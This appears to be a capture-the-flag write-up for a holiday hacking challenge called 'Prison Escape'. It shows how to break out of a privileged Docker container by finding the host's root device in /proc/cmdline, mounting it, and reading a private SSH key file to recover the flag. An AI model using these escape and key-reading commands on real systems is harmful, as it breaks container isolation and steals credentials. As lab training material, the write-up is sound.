
# Objective 6: Prison Escape
**Location: Elfen Ring / Elf House / Prison Escape Terminal**  
**Elf: Tinsel Upatree**

This objective is about getting familiar with the rest of breaking out of a docker container if the permissions are not set appropriately.
With the below commands, we determine the root filesystem of the system and mount it into the Docker container.
That way we can easily get hold of the flag in the private key file.

```
sudo root
cat /proc/cmdline
panic=1 pci=off ip=dhcp console=ttyS0 reboot=k root=/dev/vda rw virtio_mmio.device=4K@0xd0000000:5 [virtio_mmio.device=4K@0xd0001000](mailto:virtio_mmio.device%3D4K@0xd0001000):6
mkdir /mnt/joergen
mount /dev/vda /mnt/joergen
cat /mnt/joergen/home/jailer/.ssh/jail.key.priv
[...]
082bb339ec19de4935867
```

**082bb339ec19de4935867**

**Achievement: Prison Escape**
